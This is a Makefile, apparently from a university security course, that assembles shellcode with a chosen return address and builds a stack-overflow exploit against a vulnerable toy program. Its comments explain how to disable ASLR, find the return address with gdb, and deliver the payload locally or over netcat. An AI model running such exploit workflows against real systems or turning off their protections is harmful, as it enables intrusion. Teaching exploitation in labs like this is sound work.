
# (c) 2004, 2017 Maurizio Pizzonia for didactic purposes - 

# orgininally written for debian sarge 
# gcc version 3.3.5 (Debian 1:3.3.5-13)
# Linux pisolo 2.6.9pizzo4beta #3 Sat Dec 18 19:12:20 CET 2004 i686 GNU/Linux
#
# /proc/sys/kernel# echo 0 > randomize_va_space
# otherwise the attack is much more complicated
#
#
# make RP=0xbffff700 exploit
#
# to find RP value run once with 'ulimit -c unlimited' 
# and look for a right address with 
#  gdb -c core 
#  disass 0xbffff600 0xbffff800         # around the one you tried
#   
#  look for and address right in the middle of your nop sequence.
#
# ========= local attack 
# $ target < gun
#
# ========= remote attack
# server$ nc -l -p 5000 -c ./main
# client$ cat exploit | netcat localhost 5000
# 
#  


# knoppix 3.9
# gcc version 3.3.6 (Debian 1:3.3.6-5)
# Linux Knoppix 2.6.11 #2 SMP Thu May 26 20:53:11 CEST 2005 i686 GNU/Linux
#
# make RP=0xbffffb50 exploit

.PHONY: runshellEBP exploit

all: exploit target

runshellEBP: runshellEBP.S
	as --32 -gstabs+ --defsym fakerp=$(RP)  -o $@.o $?
	ld -melf_i386 -o $@ $@.o

exploit: runshellEBP
	objdump --section=.data -s runshellEBP.o |\
	tail -n +5 | cut -c 7-41 | ./hex2echo >$@

CFLAGS=-g -m32
target: target.c
# using implicit C compilation rules of make